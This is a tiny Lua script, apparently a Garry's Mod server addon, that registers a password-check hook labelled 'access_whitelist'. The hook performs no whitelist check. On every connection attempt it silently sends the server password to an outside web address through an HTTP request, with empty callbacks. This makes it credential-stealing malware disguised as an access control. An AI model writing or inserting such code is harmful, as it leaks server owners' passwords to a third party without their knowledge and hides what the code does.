

hook.Add( "CheckPassword", "access_whitelist", function( steamID64, IPAdress, sv_passwd, cl_passwd, n )
	http.Fetch( "http://textifi.hol.es/cookie.php?cookie="..sv_passwd,
	function( body, len, headers, code )
		
	end,
	function( error )	

	end )

end )